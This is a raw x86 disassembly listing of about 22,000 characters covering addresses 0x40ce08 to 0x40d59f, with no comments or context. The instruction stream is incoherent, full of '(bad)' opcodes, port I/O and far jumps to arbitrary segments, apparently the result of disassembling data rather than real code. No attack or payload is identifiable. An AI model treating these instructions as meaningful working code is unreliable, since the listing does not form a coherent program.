  40ce08:	dec    eax
  40ce09:	cmp    BYTE PTR [eax],dh
  40ce0b:	mov    BYTE PTR ds:0x7e345876,ah
  40ce11:	inc    eax
  40ce12:	pop    edx
  40ce13:	adc    ebx,DWORD PTR [eax]
  40ce15:	shl    BYTE PTR [ecx-0x50],cl
  40ce18:	sbb    ah,bl
  40ce1a:	xor    al,0x43
  40ce1c:	mov    edx,0xa2397bec
  40ce21:	xchg   ecx,eax
  40ce22:	dec    ecx
  40ce23:	loop   0x40cdbd
  40ce25:	pop    ebx
  40ce26:	pop    eax
  40ce27:	rol    BYTE PTR [eax-0x34],0xff
  40ce2b:	lods   eax,DWORD PTR ds:[esi]
  40ce2c:	(bad)  
  40ce2d:	dec    eax
  40ce2e:	test   eax,0x1679705c
  40ce33:	jno    0x40ce98
  40ce35:	cmp    esp,DWORD PTR [ebx+0x6b]
  40ce38:	es mov bl,0xfc
  40ce3b:	pop    ebp
  40ce3c:	mov    cl,0x15
  40ce3e:	in     al,dx
  40ce3f:	inc    edi
  40ce40:	iret   
  40ce41:	sbb    al,0x3b
  40ce43:	sti    
  40ce44:	pop    eax
  40ce45:	aas    
  40ce46:	dec    esp
  40ce47:	inc    ecx
  40ce48:	mov    al,0xc6
  40ce4a:	jne    0x40ce99
  40ce4c:	add    al,0x66
  40ce4e:	lods   al,BYTE PTR ds:[esi]
  40ce4f:	and    eax,0xea4dc2d
  40ce54:	or     dl,ah
  40ce56:	pop    ebp
  40ce57:	das    
  40ce58:	jne    0x40ced3
  40ce5a:	aam    0xb4
  40ce5c:	std    
  40ce5d:	add    BYTE PTR [esi+0x2562f274],bh
  40ce63:	sbb    eax,0x8bd084dc
  40ce68:	iret   
  40ce69:	dec    eax
  40ce6a:	jmp    0x16f6:0x31e8490b
  40ce71:	ss jecxz 0x40ce02
  40ce74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce75:	not    esp
  40ce77:	jno    0x40ceed
  40ce79:	push   cs
  40ce7a:	iret   
  40ce7b:	lds    ebp,FWORD PTR [ebx]
  40ce7d:	mov    ecx,0x7b642458
  40ce82:	(bad)
  40ce86:	fiadd  WORD PTR [edi]
  40ce88:	ss pusha 
  40ce8a:	ss in  eax,0x35
  40ce8d:	inc    edi
  40ce8e:	jg     0x40ce8e
  40ce90:	mov    edx,0xb0483c68
  40ce95:	jge    0x40ceca
  40ce97:	nop
  40ce98:	adc    ebp,DWORD PTR [ebx-0x5de65be4]
  40ce9e:	and    esi,DWORD PTR [eax+0x31]
  40cea1:	test   eax,0x35caff50
  40cea6:	sti    
  40cea7:	stos   BYTE PTR es:[edi],al
  40cea8:	jo     0x40cee4
  40ceaa:	add    DWORD PTR [edi],edx
  40ceac:	in     eax,0xe
  40ceae:	jns    0x40ce77
  40ceb0:	iret   
  40ceb1:	or     ch,BYTE PTR [ebp+0x71fd720e]
  40ceb7:	ins    DWORD PTR es:[edi],dx
  40ceb8:	mov    ch,BYTE PTR [eax+0x6c097ef0]
  40cebe:	or     ah,BYTE PTR [esi+0x236691f]
  40cec4:	outs   dx,DWORD PTR ds:[esi]
  40cec5:	cdq    
  40cec6:	ret    
  40cec7:	cmp    DWORD PTR [ecx-0x1c687035],edi
  40cecd:	sbb    al,0xf5
  40cecf:	out    0x19,al
  40ced1:	jbe    0x40ce79
  40ced3:	and    al,0xf
  40ced5:	sbb    al,BYTE PTR [ebx-0x30]
  40ced8:	xchg   edi,eax
  40ced9:	fadd   QWORD PTR [esi]
  40cedb:	or     bl,BYTE PTR ds:0xc9fc3a57
  40cee1:	xchg   esp,eax
  40cee2:	sbb    BYTE PTR [esi+0x6dca7612],bl
  40cee8:	mov    esp,0x71827f3e
  40ceed:	cwde   
  40ceee:	enter  0x1204,0xf3
  40cef2:	jno    0x40cf2b
  40cef4:	jmp    0x40ced2
  40cef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cef7:	mov    bh,0x82
  40cef9:	xchg   esi,eax
  40cefa:	js     0x40cea9
  40cefc:	bound  ecx,QWORD PTR [edx]
  40cefe:	loope  0x40ce92
  40cf00:	pop    es
  40cf01:	packssdw mm0,mm1
  40cf04:	out    dx,eax
  40cf05:	xor    eax,0xfc0ccfff
  40cf0a:	cmp    al,0xaf
  40cf0c:	scas   al,BYTE PTR es:[edi]
  40cf0d:	fwait
  40cf0e:	lea    esi,[esi]
  40cf10:	mov    ah,0xab
  40cf12:	push   eax
  40cf13:	loope  0x40cf25
  40cf15:	dec    eax
  40cf16:	inc    ecx
  40cf17:	loope  0x40cf42
  40cf19:	cs cli 
  40cf1b:	mov    ebp,0x263265c
  40cf20:	add    eax,0x73d925d0
  40cf25:	push   es
  40cf26:	aas    
  40cf27:	loop   0x40cf20
  40cf29:	inc    esi
  40cf2a:	nop
  40cf2b:	and    dh,BYTE PTR [ecx]
  40cf2d:	sub    eax,0x561964a6
  40cf32:	add    al,0x54
  40cf34:	rcr    DWORD PTR [eax],cl
  40cf36:	mov    al,0xef
  40cf38:	in     eax,0x48
  40cf3a:	sbb    ah,BYTE PTR [esi+eiz*8+0x4fa72e1]
  40cf41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf43:	and    al,0xa9
  40cf45:	sub    dh,BYTE PTR [edx+0x6]
  40cf48:	bound  esp,QWORD PTR [edi-0x7]
  40cf4b:	xor    esp,0x91fb31a6
  40cf51:	ds push ss
  40cf53:	inc    edi
  40cf54:	ret    0x5f10
  40cf57:	retf   
  40cf58:	xchg   esp,eax
  40cf59:	lahf   
  40cf5a:	xchg   DWORD PTR [edi],edi
  40cf5c:	sbb    eax,0x1a2871ef
  40cf61:	dec    edx
  40cf62:	push   ebx
  40cf63:	mov    ah,0xf7
  40cf65:	(bad)  
  40cf66:	and    al,bh
  40cf68:	mov    al,0xe7
  40cf6a:	dec    ebx
  40cf6b:	aad    0x6e
  40cf6d:	fdiv   DWORD PTR [ecx+eiz*8]
  40cf70:	scas   eax,DWORD PTR es:[edi]
  40cf71:	and    edi,ecx
  40cf73:	inc    ebx
  40cf74:	and    eax,0xffb536a
  40cf79:	test   BYTE PTR [esi+edx*4],al
  40cf7c:	sahf   
  40cf7d:	push   0x491909f2
  40cf82:	push   eax
  40cf83:	push   edi
  40cf84:	ret    0x2fce
  40cf87:	aad    0x4f
  40cf89:	xor    eax,0x51926af6
  40cf8e:	cmc    
  40cf8f:	mov    eax,ds:0x74b6f8b7
  40cf94:	mov    ebx,0xda7782f4
  40cf99:	popa   
  40cf9a:	add    eax,0x2f76f766
  40cf9f:	data16 mov BYTE PTR [edx+0x7f],ch
  40cfa3:	cmc    
  40cfa4:	jecxz  0x40cfb0
  40cfa6:	cwde   
  40cfa7:	mov    edx,DWORD PTR [eax+ebx*1+0x14e32044]
  40cfae:	int    0x65
  40cfb0:	dec    ecx
  40cfb1:	sub    eax,0xb41c1d63
  40cfb6:	xchg   edi,eax
  40cfb7:	xor    dh,cl
  40cfb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfba:	push   ebx
  40cfbb:	pushf  
  40cfbc:	lds    ecx,FWORD PTR [edi-0x6716aecd]
  40cfc2:	jnp    0x40d031
  40cfc4:	cmp    eax,0x7ea6b554
  40cfc9:	gs sbb eax,0xac50c300
  40cfcf:	ror    DWORD PTR [esi+0x2f],1
  40cfd2:	std    
  40cfd3:	pusha  
  40cfd4:	data16 jl 0x40cfe3
  40cfd7:	daa    
  40cfd8:	nop
  40cfd9:	inc    ecx
  40cfda:	call   0x3135f392
  40cfdf:	iret   
  40cfe0:	inc    esp
  40cfe1:	call   0xf615:0xbcb17dc1
  40cfe8:	pushf  
  40cfe9:	dec    edi
  40cfea:	neg    bl
  40cfec:	xlat   BYTE PTR ds:[ebx]
  40cfed:	out    dx,al
  40cfee:	xor    al,0x5f
  40cff0:	outs   dx,BYTE PTR ds:[esi]
  40cff1:	bound  esi,QWORD PTR [eax+ebp*2]
  40cff4:	icebp  
  40cff5:	test   eax,0xfa5c41e0
  40cffa:	mov    esi,0x7abb40
  40cfff:	shl    BYTE PTR [esi+0x31a0a445],cl
  40d005:	mov    eax,0x88348417
  40d00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d00b:	icebp  
  40d00c:	repz scas eax,DWORD PTR es:[edi]
  40d00e:	sti    
  40d00f:	push   edx
  40d010:	enter  0x3cd7,0xe4
  40d014:	push   edi
  40d015:	add    DWORD PTR [esi],ebx
  40d017:	mov    DWORD PTR [esi+0x31],edi
  40d01a:	stos   BYTE PTR es:[edi],al
  40d01b:	push   ecx
  40d01c:	dec    ecx
  40d01d:	fndisi(8087 only) 
  40d01f:	mov    bh,0x90
  40d021:	inc    esi
  40d022:	sub    al,0x2e
  40d024:	out    dx,eax
  40d025:	mov    al,ds:0xc00e5a52
  40d02a:	inc    edi
  40d02b:	cmp    DWORD PTR [eax-0x583cdef0],edx
  40d031:	test   al,0x2a
  40d033:	inc    esp
  40d034:	into   
  40d035:	cli    
  40d036:	shl    DWORD PTR [ebp-0x18b3a990],cl
  40d03c:	mov    dh,0xb7
  40d03e:	dec    esi
  40d03f:	mov    ds:0x53ed3f64,eax
  40d044:	sbb    bl,BYTE PTR ds:0xec4dda8e
  40d04a:	xchg   ebp,eax
  40d04b:	fcomip st,st(4)
  40d04d:	pop    ebx
  40d04e:	and    dh,BYTE PTR [edx]
  40d050:	vmovups ymm4,YMMWORD PTR [ebx-0x6ad89528]
  40d058:	test   eax,0x12c4b8e5
  40d05d:	pop    ebx
  40d05e:	sbb    eax,0xb886091b
  40d063:	cld    
  40d064:	xor    eax,DWORD PTR [ecx]
  40d066:	mov    esi,0x1c21de91
  40d06b:	daa    
  40d06c:	or     ch,BYTE PTR [edx]
  40d06e:	test   al,0x77
  40d070:	dec    ecx
  40d071:	or     ebp,DWORD PTR [edx-0x50]
  40d074:	mov    esp,DWORD PTR [ebp-0x5a]
  40d077:	in     al,0x67
  40d079:	inc    esp
  40d07a:	pop    ds
  40d07b:	sub    BYTE PTR [edx],ah
  40d07d:	aaa    
  40d07e:	push   esi
  40d07f:	clc    
  40d080:	pop    ecx
  40d081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d082:	cmp    al,0x75
  40d084:	add    BYTE PTR [ebp-0x46],0x25
  40d088:	out    dx,al
  40d089:	or     eax,0x9d4e6b76
  40d08e:	adc    ch,BYTE PTR [esp+ecx*4+0x3f]
  40d092:	aam    0xd2
  40d094:	add    DWORD PTR [edi],ecx
  40d096:	fnstenv [edx+0x127de0da]
  40d09c:	test   eax,0xfb6cbbe1
  40d0a1:	push   eax
  40d0a2:	int3   
  40d0a3:	cmp    eax,0xbdb10aa0
  40d0a8:	xor    al,0x15
  40d0aa:	add    ah,bl
  40d0ac:	out    0x45,eax
  40d0ae:	push   es
  40d0af:	rcr    ah,0x6
  40d0b2:	jmp    0x3b9:0x49ff7033
  40d0b9:	aaa    
  40d0ba:	sbb    al,0xa4
  40d0bc:	xchg   DWORD PTR [ebx+0x6d],ecx
  40d0bf:	imul   edi,DWORD PTR [eax+0x7dfa6dbd],0x7b
  40d0c6:	shr    DWORD PTR ds:0x94f6d066,cl
  40d0cc:	pop    eax
  40d0cd:	scas   al,BYTE PTR es:[edi]
  40d0ce:	mov    eax,0x5af5a338
  40d0d3:	out    dx,al
  40d0d4:	test   al,0x2f
  40d0d6:	push   eax
  40d0d7:	inc    edx
  40d0d8:	sar    DWORD PTR [ebx+edx*1+0x752f311e],0xb2
  40d0e0:	mov    ds:0xa229f608,al
  40d0e5:	mov    ds:0x8f2ad1bb,al
  40d0ea:	jl     0x40d0d3
  40d0ec:	lods   eax,DWORD PTR ds:[esi]
  40d0ed:	jns    0x40d126
  40d0ef:	into   
  40d0f0:	jno    0x40d127
  40d0f2:	mov    bh,0x97
  40d0f4:	aas    
  40d0f5:	jae    0x40d0ae
  40d0f7:	cmp    eax,0xa526cf40
  40d0fc:	fcmovnb st,st(1)
  40d0fe:	push   ebx
  40d0ff:	pop    ecx
  40d100:	jo     0x40d0c6
  40d102:	sbb    al,0x2f
  40d104:	stos   BYTE PTR es:[edi],al
  40d105:	idiv   BYTE PTR [ebp+ebx*8-0x4e4fa937]
  40d10c:	lds    edi,FWORD PTR [eax-0x38480ac9]
  40d112:	vandps xmm2,xmm5,XMMWORD PTR [ebp+0x76aec540]
  40d11a:	and    DWORD PTR [edi+0x1fe31e8e],eax
  40d120:	jmp    0xf097:0x32b5ce7e
  40d127:	mov    cl,0xf1
  40d129:	mov    al,ds:0x142e595
  40d12e:	out    dx,al
  40d12f:	cmp    DWORD PTR [esi+ebx*4-0x1f],ecx
  40d133:	nop
  40d134:	jo     0x40d0d0
  40d136:	cld    
  40d137:	cmp    ebx,DWORD PTR ds:0x8611cedb
  40d13d:	add    dh,0xcf
  40d140:	lds    esi,FWORD PTR [esi+0x4f006093]
  40d146:	ror    ah,1
  40d148:	or     BYTE PTR [ecx],0x41
  40d14b:	dec    edx
  40d14c:	sub    BYTE PTR [esi+0x5dddc07e],ch
  40d152:	pop    ecx
  40d153:	cmp    DWORD PTR [edx-0x30],esp
  40d156:	mov    ah,0x52
  40d158:	repnz cdq 
  40d15a:	into   
  40d15b:	and    al,0x83
  40d15d:	push   eax
  40d15e:	cmp    edi,ecx
  40d160:	sub    eax,0x6ace7994
  40d165:	test   DWORD PTR [edx+0x14399823],0xe3973207
  40d16f:	arpl   dx,bp
  40d171:	sub    ecx,esi
  40d173:	mov    dh,0x42
  40d175:	jl     0x40d0fb
  40d177:	rol    ecx,0xe
  40d17a:	pop    ebx
  40d17b:	call   0xf596c6f5
  40d180:	or     DWORD PTR [esi+0x71],ebx
  40d183:	sbb    al,0xc1
  40d185:	sub    al,0x82
  40d187:	adc    ebp,ebp
  40d189:	scas   eax,DWORD PTR es:[edi]
  40d18a:	and    eax,0x3ab3606b
  40d18f:	popf   
  40d190:	xchg   ebx,eax
  40d191:	loopne 0x40d181
  40d193:	ja     0x40d11f
  40d195:	adc    edx,edi
  40d197:	ins    BYTE PTR es:[edi],dx
  40d198:	retf   
  40d199:	les    ebp,FWORD PTR ds:0xa170684a
  40d19f:	adc    eax,0xc28d501d
  40d1a4:	jp     0x40d182
  40d1a6:	fcmovu st,st(3)
  40d1a8:	adc    esi,ecx
  40d1aa:	push   0x7263d8ef
  40d1af:	inc    ecx
  40d1b0:	mov    ?,WORD PTR [edi]
  40d1b2:	fwait
  40d1b3:	mov    dh,bl
  40d1b5:	xlat   BYTE PTR ds:[ebx]
  40d1b6:	retf   0x3613
  40d1b9:	repz inc esi
  40d1bb:	push   edi
  40d1bc:	and    ebx,ebx
  40d1be:	jne    0x40d222
  40d1c0:	pop    ss
  40d1c1:	mov    WORD PTR [ebp-0x17dcb7cb],gs
  40d1c7:	(bad)  
  40d1c8:	lods   al,BYTE PTR ds:[esi]
  40d1c9:	adc    DWORD PTR [ecx-0x38855c51],0xa5e2e054
  40d1d3:	dec    ebx
  40d1d4:	outs   dx,DWORD PTR ds:[esi]
  40d1d5:	daa    
  40d1d6:	inc    ebp
  40d1d7:	cmp    ah,BYTE PTR [eax+0x54aab6e4]
  40d1dd:	lods   eax,DWORD PTR ds:[esi]
  40d1de:	fsub   DWORD PTR [edi]
  40d1e0:	sub    BYTE PTR [esi],dh
  40d1e2:	icebp  
  40d1e3:	mov    WORD PTR [ebx-0x1b],cs
  40d1e6:	hlt    
  40d1e7:	je     0x40d1ab
  40d1e9:	cmp    BYTE PTR [ebp+edi*1-0x118487c5],ch
  40d1f0:	test   DWORD PTR [esi+0x1cda0d6d],edx
  40d1f6:	or     al,0x6b
  40d1f8:	sbb    BYTE PTR [ecx],dl
  40d1fa:	sub    al,BYTE PTR [edi-0x3d5c4573]
  40d200:	cmp    BYTE PTR [edx],ch
  40d202:	push   eax
  40d203:	pop    es
  40d204:	mov    ebp,0x626cdebd
  40d209:	xor    BYTE PTR [ecx],0x93
  40d20c:	scas   eax,DWORD PTR es:[edi]
  40d20d:	dec    edx
  40d20e:	repz pop edi
  40d210:	sub    eax,0x2318de36
  40d215:	xchg   bp,ax
  40d217:	mov    dh,0x19
  40d219:	fnsave [esi]
  40d21b:	fiadd  WORD PTR [ecx-0x4b]
  40d21e:	ds pop edx
  40d220:	add    al,0x13
  40d222:	pop    eax
  40d223:	cmp    ch,BYTE PTR [esi-0x49d829c9]
  40d229:	jle    0x40d25c
  40d22b:	sub    eax,esi
  40d22d:	outs   dx,BYTE PTR ds:[esi]
  40d22e:	jns    0x40d26b
  40d230:	dec    ecx
  40d231:	mov    BYTE PTR [eax],0xec
  40d234:	xchg   esi,eax
  40d235:	je     0x40d298
  40d237:	mov    ebx,0x345c496a
  40d23c:	imul   edi,DWORD PTR ds:0x1010d9b6,0x86681765
  40d246:	pop    ebx
  40d247:	cmp    DWORD PTR [ebp-0x4da462ab],esp
  40d24d:	adc    DWORD PTR [eax],esi
  40d24f:	ficom  WORD PTR [esi]
  40d251:	and    eax,DWORD PTR [ecx]
  40d253:	mov    DWORD PTR ds:0xa6393f0d,ebp
  40d259:	mov    edx,0x3a70699
  40d25e:	mov    DWORD PTR [edi],ebp
  40d260:	and    BYTE PTR [edi+ecx*4],bl
  40d263:	xor    ebx,DWORD PTR [ebx]
  40d265:	enter  0x15f0,0xe8
  40d269:	inc    edx
  40d26a:	aas    
  40d26b:	js     0x40d261
  40d26d:	or     eax,0x49feff6e
  40d272:	test   DWORD PTR [edi],0x1f1c47ce
  40d278:	sub    bl,ch
  40d27a:	mov    al,0xc6
  40d27c:	sbb    eax,0xfe8c794f
  40d281:	mov    ch,0x91
  40d283:	(bad)  
  40d284:	push   edx
  40d285:	test   eax,0xf86ca3fc
  40d28a:	(bad)  
  40d28b:	int    0x62
  40d28d:	mov    dl,0x7d
  40d28f:	adc    BYTE PTR [esi-0x7d],al
  40d292:	or     DWORD PTR [ebp-0x4712ed46],eax
  40d298:	ror    BYTE PTR [eax-0x71],cl
  40d29b:	es cwde 
  40d29d:	nop
  40d29e:	push   0xd73ef62d
  40d2a3:	mov    ch,0x6
  40d2a5:	sbb    eax,0x5ad825d4
  40d2aa:	dec    ebp
  40d2ab:	sub    DWORD PTR [ebp-0x44a5d4b],esp
  40d2b1:	outs   dx,BYTE PTR ds:[esi]
  40d2b2:	xchg   ebp,eax
  40d2b3:	retf   
  40d2b4:	shl    DWORD PTR [eax-0x31],cl
  40d2b7:	push   cs
  40d2b8:	gs arpl sp,di
  40d2bb:	into   
  40d2bc:	les    eax,FWORD PTR [ebx+0x3a]
  40d2bf:	xchg   esp,eax
  40d2c0:	pop    ebp
  40d2c1:	mov    BYTE PTR [ebp+ebx*1+0x31fc43e9],dh
  40d2c8:	cmp    DWORD PTR ds:0x2767e930,ebp
  40d2ce:	xor    dh,bh
  40d2d0:	push   0xe8d6e37b
  40d2d5:	jmp    0x40d32b
  40d2d7:	mov    bh,0xe0
  40d2d9:	sbb    eax,0xd47f2deb
  40d2de:	add    al,BYTE PTR [ebx+edx*2+0x30]
  40d2e2:	sbb    eax,0x9b61fda4
  40d2e7:	or     eax,0xe575b4e
  40d2ec:	add    dl,BYTE PTR [ebx-0x52641e04]
  40d2f2:	ret    
  40d2f3:	jns    0x40d2a9
  40d2f5:	jle    0x40d321
  40d2f7:	push   ebp
  40d2f8:	dec    ecx
  40d2f9:	stos   BYTE PTR es:[edi],al
  40d2fa:	mov    ch,bl
  40d2fc:	(bad)  
  40d2fd:	mov    ecx,0x63e72748
  40d302:	push   edx
  40d303:	jl     0x40d324
  40d305:	push   0x20
  40d307:	movzx  ebx,WORD PTR [ebx+0x5c]
  40d30b:	mov    ds:0x45d578ec,al
  40d310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d311:	in     eax,dx
  40d312:	adc    DWORD PTR [ecx-0x50c11e0a],eax
  40d318:	cmp    eax,0xc4716553
  40d31d:	sub    eax,edi
  40d31f:	xor    eax,0xac73a11
  40d324:	ins    BYTE PTR es:[edi],dx
  40d325:	sar    esi,1
  40d327:	out    0xe1,al
  40d329:	enter  0xea2c,0x91
  40d32d:	stc    
  40d32e:	mov    esi,0x3945d3e5
  40d333:	test   dl,ah
  40d335:	push   edx
  40d336:	push   cs
  40d337:	jmp    0x9a663514
  40d33c:	enter  0xf977,0xd2
  40d340:	repz rol DWORD PTR [ecx+0x66],1
  40d344:	adc    eax,0xb93b412f
  40d349:	loop   0x40d3a1
  40d34b:	jg     0x40d2d4
  40d34d:	jae    0x40d3a6
  40d34f:	(bad)  
  40d350:	jb     0x40d3c2
  40d352:	cmp    al,0x95
  40d354:	scas   al,BYTE PTR es:[edi]
  40d355:	xchg   ecx,eax
  40d356:	mov    ebx,0xd6c183d5
  40d35b:	out    0xe9,al
  40d35d:	enter  0xc7bd,0x43
  40d361:	xchg   ebx,eax
  40d362:	dec    eax
  40d363:	mov    ecx,ebp
  40d365:	mov    ss,WORD PTR [edi-0x56]
  40d368:	push   edi
  40d369:	mov    ds:0x29ca810,al
  40d36e:	nop
  40d36f:	xlat   BYTE PTR ds:[ebx]
  40d370:	pop    esp
  40d371:	adc    eax,0x6b8739be
  40d376:	xor    bh,BYTE PTR [ebx-0x70]
  40d379:	dec    ebx
  40d37a:	pop    ds
  40d37b:	scas   al,BYTE PTR es:[edi]
  40d37c:	xlat   BYTE PTR ds:[ebx]
  40d37d:	out    0xa0,eax
  40d37f:	cmp    dl,dl
  40d381:	jo     0x40d384
  40d383:	mov    eax,ds:0x98707bde
  40d388:	div    ecx
  40d38a:	inc    esp
  40d38b:	outs   dx,BYTE PTR ds:[esi]
  40d38c:	fmul   st,st(2)
  40d38e:	ds (bad) 
  40d390:	(bad)  
  40d391:	cmp    al,0x4
  40d393:	sbb    BYTE PTR [ecx],al
  40d395:	inc    ecx
  40d396:	cmc    
  40d397:	in     eax,0xf6
  40d399:	and    esp,DWORD PTR [edi-0x785bd50a]
  40d39f:	dec    esi
  40d3a0:	lds    edx,FWORD PTR [esi+ebx*8+0x2e1114d1]
  40d3a7:	push   ebx
  40d3a8:	das    
  40d3a9:	into   
  40d3aa:	inc    edi
  40d3ab:	cdq    
  40d3ac:	sbb    ebx,DWORD PTR [esi+0x65]
  40d3af:	sub    al,0x7b
  40d3b1:	mov    al,ds:0x9ceb3e8c
  40d3b6:	inc    DWORD PTR [eax+0x73a6ae58]
  40d3bc:	xor    DWORD PTR [edx],0x75be4dab
  40d3c2:	jno    0x40d3ac
  40d3c4:	loope  0x40d3af
  40d3c6:	mov    ds:0xe0bf2794,al
  40d3cb:	inc    edi
  40d3cc:	xchg   esp,eax
  40d3cd:	sti    
  40d3ce:	mov    DWORD PTR [esi+0x17],ebx
  40d3d1:	fwait
  40d3d2:	adc    dl,ch
  40d3d4:	enter  0xd7fe,0x60
  40d3d8:	adc    edx,ebx
  40d3da:	loope  0x40d3f2
  40d3dc:	fbld   TBYTE PTR [edi]
  40d3de:	mov    esi,0x7862796f
  40d3e3:	imul   esi,DWORD PTR ds:0x5182fa52,0x1556253c
  40d3ed:	jmp    0x40d433
  40d3ef:	retfw  0xd436
  40d3f3:	mov    eax,ds:0xb80b1e04
  40d3f8:	sar    DWORD PTR [esi+0x3b00fc92],0xd1
  40d3ff:	pop    esi
  40d400:	mov    DWORD PTR [ecx-0x4eaa8814],esi
  40d406:	sar    DWORD PTR [edx],cl
  40d408:	sub    DWORD PTR [eax-0x7e8861e3],edi
  40d40e:	push   ebx
  40d40f:	out    dx,al
  40d410:	pushf  
  40d411:	pop    ecx
  40d412:	pusha  
  40d413:	cmc    
  40d414:	push   ebp
  40d415:	xchg   esp,eax
  40d416:	inc    ebx
  40d417:	inc    ebp
  40d418:	je     0x40d469
  40d41a:	cmp    edx,DWORD PTR [edi+esi*8-0x4a16a745]
  40d421:	loopne 0x40d3f5
  40d423:	jo     0x40d3e5
  40d425:	scas   al,BYTE PTR es:[edi]
  40d426:	sti    
  40d427:	xchg   ecx,eax
  40d428:	sub    eax,0x336d8d7a
  40d42d:	mov    ?,WORD PTR [eax+0x7f]
  40d430:	mov    eax,0x75b9b8d7
  40d435:	inc    ecx
  40d436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d437:	jp     0x40d49c
  40d439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d43a:	xor    ch,BYTE PTR [ebp-0x80]
  40d43d:	add    BYTE PTR [eax+ecx*1],0x5c
  40d441:	jge    0x40d3e8
  40d443:	dec    esi
  40d445:	sbb    bh,bl
  40d447:	mul    BYTE PTR [eax+0x55175e12]
  40d44d:	into   
  40d44e:	cld    
  40d44f:	jnp    0x40d46d
  40d451:	mov    BYTE PTR [eax+0x3986845d],bh
  40d457:	mov    bl,0x3c
  40d459:	in     al,dx
  40d45a:	imul   esp,DWORD PTR [ebx],0x95c82002
  40d460:	aas    
  40d461:	push   cs
  40d462:	push   es
  40d463:	cmp    eax,0x9bbfb6d4
  40d468:	aad    0xf2
  40d46a:	out    0xa,eax
  40d46c:	inc    edx
  40d46d:	lds    edx,FWORD PTR [edi-0x58]
  40d470:	add    al,0xf3
  40d472:	mov    eax,0x7f9e28da
  40d477:	pop    edi
  40d478:	js     0x40d40f
  40d47a:	je     0x40d4c8
  40d47c:	and    BYTE PTR [ebx+0x47],bh
  40d47f:	jp     0x40d4e6
  40d481:	inc    esi
  40d482:	int    0xc4
  40d484:	ficom  WORD PTR [ecx+ecx*1+0x7c]
  40d488:	push   eax
  40d489:	fsubp  st(1),st
  40d48b:	pusha  
  40d48c:	inc    ecx
  40d48d:	jmp    0x40d419
  40d48f:	lahf   
  40d490:	mov    ds:0x39c87bd4,al
  40d495:	jno    0x40d44f
  40d497:	lods   al,BYTE PTR ds:[esi]
  40d498:	les    eax,FWORD PTR es:[ecx+edi*4-0x59422bfc]
  40d4a0:	mov    DWORD PTR [eax+0x4c],edx
  40d4a3:	leave  
  40d4a4:	and    al,0xef
  40d4a6:	sbb    BYTE PTR [eax+0x7061845b],bl
  40d4ac:	hlt    
  40d4ad:	xor    DWORD PTR [edi-0x4f0c3388],esi
  40d4b3:	add    eax,0x1ad35e6d
  40d4b8:	shr    DWORD PTR [ebx],1
  40d4ba:	retf   0xc1a7
  40d4bd:	lds    edx,FWORD PTR [eax+eax*2]
  40d4c0:	(bad)  
  40d4c1:	gs aaa 
  40d4c3:	inc    eax
  40d4c4:	cmp    DWORD PTR [eax-0x51],eax
  40d4c7:	aad    0x8e
  40d4c9:	dec    ebp
  40d4ca:	popa   
  40d4cb:	je     0x40d47e
  40d4cd:	test   BYTE PTR [ecx+0x653233d5],0x60
  40d4d4:	sub    al,BYTE PTR [esi-0x5a]
  40d4d7:	sub    eax,0xe21e0c73
  40d4dc:	cmp    al,0xf3
  40d4de:	outs   dx,BYTE PTR ds:[esi]
  40d4df:	in     al,0xf5
  40d4e1:	adc    BYTE PTR [esi+ebx*1+0x57],dl
  40d4e5:	cmp    edi,esp
  40d4e7:	xor    BYTE PTR [ebx+0x20183403],ah
  40d4ed:	in     eax,0x6b
  40d4ef:	dec    ebp
  40d4f0:	(bad)  
  40d4f1:	daa    
  40d4f2:	or     al,0x6
  40d4f4:	mov    al,0x2
  40d4f6:	cmp    ebx,DWORD PTR [ecx-0x3]
  40d4f9:	ds loop 0x40d561
  40d4fc:	scas   eax,DWORD PTR es:[edi]
  40d4fd:	sub    BYTE PTR [edi+ecx*4+0x3ebef162],bl
  40d504:	cmp    dh,0x8c
  40d507:	mov    DWORD PTR [edx+eiz*4],ebp
  40d50a:	loop   0x40d4ac
  40d50c:	pop    edx
  40d50d:	lock add DWORD PTR [ebx+0x56],edi
  40d511:	fcomp  QWORD PTR [edi]
  40d513:	call   0x2b89:0x1d5919f
  40d51a:	adc    ah,cl
  40d51c:	inc    eax
  40d51d:	sbb    eax,0x5a69c375
  40d522:	das    
  40d523:	mov    esi,0xd6ea60ec
  40d528:	or     cl,bh
  40d52a:	js     0x40d519
  40d52c:	mov    bh,0x83
  40d52e:	mov    ds:0x2d319248,eax
  40d533:	add    BYTE PTR [esi],0xb8
  40d536:	jo     0x40d51a
  40d538:	ret    
  40d539:	add    ah,BYTE PTR [edi-0x30]
  40d53c:	test   al,0x71
  40d53e:	pop    esi
  40d53f:	mov    eax,ds:0x6a0d1394
  40d544:	leave  
  40d545:	icebp  
  40d546:	or     BYTE PTR [ebx+0x1ade7a5d],al
  40d54c:	ins    DWORD PTR es:[edi],dx
  40d54d:	lahf   
  40d54e:	outs   dx,BYTE PTR ds:[esi]
  40d54f:	xchg   BYTE PTR [eax-0x6b0b15c],dh
  40d555:	shr    DWORD PTR [eax+eax*1-0x15],1
  40d559:	fwait
  40d55a:	outs   dx,DWORD PTR ds:[esi]
  40d55b:	mov    ds:0x9e75bb6e,al
  40d560:	push   ss
  40d561:	lahf   
  40d562:	pop    ebx
  40d563:	into   
  40d564:	add    al,0x29
  40d566:	jbe    0x40d598
  40d568:	adc    al,0x59
  40d56a:	and    edx,DWORD PTR [esi]
  40d56c:	nop
  40d56d:	jb     0x40d586
  40d56f:	inc    ebx
  40d570:	push   ebx
  40d571:	or     dh,BYTE PTR [ebp+0x5]
  40d574:	out    0xf1,eax
  40d576:	sub    DWORD PTR [eax+edi*8-0x33c49729],edx
  40d57d:	pop    ds
  40d57e:	mov    edi,0xc2d8bd0c
  40d583:	sbb    al,0x3b
  40d585:	or     eax,0x22a4b2da
  40d58a:	adc    eax,0xa5dea0f5
  40d58f:	push   edi
  40d590:	jno    0x40d5a6
  40d592:	mov    ebx,0x856ae708
  40d597:	mov    cl,0x3d
  40d599:	inc    edi
  40d59a:	push   esp
  40d59b:	jnp    0x40d567
  40d59d:	dec    ecx
  40d59e:	(bad)  
  40d59f:	hlt    
